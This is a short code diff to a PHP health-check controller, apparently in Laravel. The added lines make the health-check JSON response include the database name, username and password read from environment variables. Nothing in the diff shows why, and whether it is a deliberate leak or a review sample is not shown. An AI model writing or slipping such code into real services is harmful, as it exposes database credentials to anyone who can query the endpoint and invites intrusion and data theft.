@@ -18,7 +18,10 @@ class HealthCheckController extends Controller
             'timestamp' => now(),
             'service' => config('app.name'),
             'environment' => config('app.env'),
-            'check' => 123
+            'check' => 123,
+            'DB_DATABASE' => env('DB_DATABASE', 'forge'),
+            'DB_USERNAME' => env('DB_USERNAME', 'forge'),
+            'DB_PASSWORD' => env('DB_PASSWORD', 'forge'),
         ]);
     }
 } 
